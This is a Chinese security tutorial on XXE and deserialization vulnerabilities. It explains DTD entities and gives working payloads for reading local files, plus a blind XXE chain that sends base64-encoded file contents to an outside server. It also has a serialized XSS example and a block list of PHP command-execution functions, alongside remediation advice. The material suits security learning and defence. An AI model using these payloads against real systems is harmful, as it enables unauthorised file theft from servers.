XXE——
XXE(XML External Entity Injection)全称为XML外部实体注入
如果使用的php中libxml低于2.9.1,或设置了libxml_disable_entity_loader(FALSE),就会造成XXE漏洞
学习参考地址:https://xz.aliyun.com/t/3357
XML和DTD知识
XML文档结构
XML文档必须有一个根元素
XML元素都必须有一个关闭标签
XML标签对大小写敏感
XML元素必须被正确的嵌套
XML属性值必须加引号
XML外部实体
什么是XML外部实体？
两个采用不同技术栈的系统可以通过XML进行通信和交换数据。
在解析外部实体的过程中,XML解析器可以根据URL中指定的方案(协议)来查询各种网络协议和服务(DNS,FTP,HTTP,SMB等)。
外部实体对于在文档中创建动态引用非常有用,这样对引用资源所做的任何更改都会在文档中自动更新。
什么是XML外部实体攻击？
在处理外部实体时,可以针对应用程序启动许多攻击。
这些攻击包括泄露本地系统文件,或利用各种方案的网络访问功能来操纵内部应用程序。
通过将这些攻击与其他实现缺陷相结合,这些攻击的范围可以扩展到客户端内存损坏,任意代码执行,甚至服务中断。

DTD基础知识——
DTD(Document Type Definition)即文档类型定义,用来为XML文档定义语义约束。
可以嵌入在XML文档中(内部声明),也可以独立的放在一个文件中(外部引用)。
参考链接:http://www.w3school.com.cn/dtd/index.asp
DTD引用方式(简要了解):
#1. DTD 内部声明
<!DOCTYPE 根元素 [元素声明] >
#2. DTD 外部引用
<!DOCTYPE 根元素名称 SYSTEM "外部DTD的URI" >
#3. 引用公共DTD
<!DOCTYPE 根元素名称 PUBLIC "DTD标识名" "公用DTD的URI" >
内部实体和外部实体
实体分为两种,内部实体和外部实体。
内部实体语法和示例:
# 内部实体定义语法
<!ENTITY 实体名称 "实体的值">
#示例
<!DOCTYPE foo [
  <!ELEMENT foo ANY > 
  <!ENTITY xxe "www.baidu.com" >
]>
<foo>&xxe;</foo>  //调用
外部实体语法和示例:
外部实体需要加SYSTEM关键字
# 外部实体定义语法
<!ENTITY 实体名称 SYSTEM "URI/URL">
#示例
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/test.dtd" > 
]>
<foo>&xxe;</foo>  //调用
通用实体和参数实体
实体也可以分成通用实体和参数实体
通用实体
在DTD中定义,在XML文档中用&引用
示例代码:
<!DOCTYPE updateProfile [
  <!ENTITY file SYSTEM "file:///c:/windows/win.ini">
]>
<updateProfile> 
   ...
   <lastname>&file;</lastname> 
   ...
</updateProfile>
参数实体
参数实体只能在DTD中定义和引用
用%实体名定义,用%实体名引用
参数实体的声明可以引用其他实体
参数实体也可以外部引用
语法和示例代码:
#语法
<!ENTITY % 实体名称 "实体的值">
<!ENTITY % 实体名称 SYSTEM "URI">
#示例
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY  % xxe SYSTEM "http://x.x.x.x:81/evils.dtd" > //定义参数实体并引用其他实体
  %xxe; //引用参数实体，可调出url中的dtd的内容
]>
<foo>&evil;</foo> //引用参数实体url中dtd内的实体
#外部实体evil中的内容。
<!ENTITY evil SYSTEM "file:///c:/windows/win.ini" > 
参数实体在 Blind XXE 中起到了至关重要的作用

寻找与利用xxe漏洞——
如何找xxe漏洞:
抓包看accept头是否接受xml
如果是,使用payload验证是否可以攻击
抓包看accept头是否接受json
如果是,把json改成xml,后用payload测试
一般xxe利用分为两大场景:有回显和无回显。
有回显的情况可以直接在页面中看到Payload的执行结果或现象
无回显的情况又称为blind xxe,可以使用外带数据通道提取数据。
有回显xxe
# 使用通用实体读取本地文件的payload
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>
<foo>&xxe;</foo>
# 使用参数实体读取本地文件的payload
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evils.dtd" >
  %xxe;
]>
<foo>&evil;</foo>
##外部 evils.dtd 中的内容。
<!ENTITY evil SYSTEM "file:///c:/windows/win.ini" >
无回显xxe
可以使用外带数据通道提取数据,先使用php://filter获取目标文件的内容,然后将内容以http请求发送到接受数据的服务器
<!DOCTYPE convert [
  <!ENTITY % remote SYSTEM "http://ip/test.dtd">
  %remote;%int;%send;
]>
##外部test.dtd中的内容。
  <!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=file:///c:/1.txt">
  <!ENTITY % int " <!ENTITY &#37; send SYSTEM 'http://192.168.0.105:8080?p=%file; '>">
整个调用过程
连续调用了三个参数实体%remote;%int;%send;,这就是我们的利用顺序
先调用%remote,调用后请求远程服务器上的test.dtd(类似于将test.dtd包含进来)
再调用%int,int会调用test.dtd中的%file,会去获取服务器上面的敏感文件,并将结果进行base64编码
后调用%send将结果,以url参数的形式发送结果到指定服务器,(实体的值中不能有%,所以将其转成html实体编码&#37;)
编码可参考：http://www.mamicode.com/info-detail-1680849.html
最后,怎么查看最终数据
有报错直接查看报错信息
无报错需要访问接受数据的服务器中的日志信息
可以看到经过base64编码过的数据,解码后便可以得到数据。编码是为了不破坏原本的XML语法,不编码会报错

XE漏洞修复与防御——
方案一:升级PHP版本
方案二:修改代码
#PHP
libxml_disable_entity_loader(true);
#JAVA
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
setFeature("http://xml.org/sax/features/external-general-entities",false)
setFeature("http://xml.org/sax/features/external-parameter-entities",false);
#Python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
方案三：黑名单过滤关键词(不推荐)
<!DOCTYPE、<!ENTITY SYSTEM、PUBLIC

反序列化漏洞——
反序列化漏洞的原理
序列化和反序列化本身并不存在问题。但当反序列化的数据可被用户控制,那么攻击者即可通过构造恶意输入,让反序列化产生非预期的对象
在此过程中执行构造的任意代码。php比较少,Java中出现的很多,因为php中还需要满足后台不正当的使用了PHP中的魔法函数的条件
PHP反序列化函数
serialize(),unserialize()
Java反序列化函数
ObjectOutputStream的writeObject()和ObjectInputStream的readObject()。
php常见的几个魔法函数:
#魔法函数前边都会有__
__construct()当一个对象创建时被调用
__destruct()当一个对象销毁时被调用
__toString()当一个对象被当作一个字符串使用
__sleep()在对象在被序列化之前运行
__wakeup将在序列化之后立即被调用
PHP反序列化漏洞实战
在线反序列化工具：https://www.w3cschool.cn/tools/index?name=unserialize
# 已序列化数据
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";} 
# 反序列化后的结果
Array{
  [__PHP_Incomplete_Class_Name]=>S
  [test]=><script>alert('xss')</script>
}
怎么构造payload呢
通过更改序列化之后的变量值,之后将payload写入一个接受序列化数据的API中就可以了
小结
回看整个过程就是对象通过序列化变为字符串,攻击者对字符串做手脚,再交给有漏洞的地方进行反序列化

反序列化漏洞防御——
类的白名单校验机制
对所有传入的反序列化对象,在反序列化过程开始前,对类型名称做一个检查,不符合白名单的类不进行反序列化操作。
很显然,这个白名单肯定是不存在Runtime的。
禁止JVM执行外部命令Runtime.exec
这个措施可以通过扩展SecurityManager可以实现。
PHP防御
安全配置好php相关参数:禁止某些php函数
服务器是用这个来禁止php的执行命令函数。
# 禁止用这些函数来执行系统命令。
disable_functions =system,passthru,shell_exec,exec,popen 
升级中间件
严格控制传入变量,严谨使用魔法函数
weblogic防御
过滤T3协议,限定可连接的IP
设置Nginx反向代理,实现t3协议和http协议隔离
JEP290(JDK8u121,7u131,6u141),这个机制主要是在每层反序列化过程中都加了一层黑名单处理
原生反序列化防御
不要反序列化不可信的数据
给反序列数据加密签名,并确保解密在反序列之前
给反序列化接口添加认证授权
反序列化服务只允许监听在本地或者开启相应防火墙
升级第三方库
升级JDK,JEP290